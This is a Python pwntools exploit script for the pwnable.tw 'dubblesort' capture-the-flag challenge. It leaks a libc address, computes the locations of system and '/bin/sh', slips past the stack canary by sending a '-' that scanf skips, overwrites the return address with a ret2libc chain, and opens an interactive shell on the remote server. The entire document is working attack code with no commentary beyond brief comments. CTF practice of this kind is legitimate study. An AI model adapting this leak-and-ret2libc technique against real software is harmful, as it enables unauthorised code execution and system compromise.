from pwn import *

# r = process('./dubblesort')
r = remote('chall.pwnable.tw',10101 )
libc = ELF('./libc_32.so.6')
offset_from_libc = 0x1b0000 
binsh_offset = next(libc.search(b'/bin/sh\x00'))
system_offset = libc.symbols['system']

def solve():
    r.sendlineafter("name :", "A"*0x18)
    leak = u32(r.recv()[30:34])
    libc_base = leak - offset_from_libc - 0xa # 0xa is the newline we input
    binsh = libc_base + binsh_offset
    system = libc_base + system_offset

    log.info("binsh addr: %s"%hex(binsh))
    log.info("system addr: %s"%hex(system))

    r.sendline(str(0x23))
    for i in range(0x18):
        r.sendlineafter("number : ", str(0))
    r.sendlineafter("number : ", '-')   # read will ignore this character, then canary will remain
    for i in range(0x8):
        r.sendlineafter("number : ", str(system))   

    r.sendlineafter("number : ", str(binsh))    # fake ret
    r.sendlineafter("number : ", str(binsh))    # /bin/sh

    r.interactive()
if __name__ == '__main__':
    solve()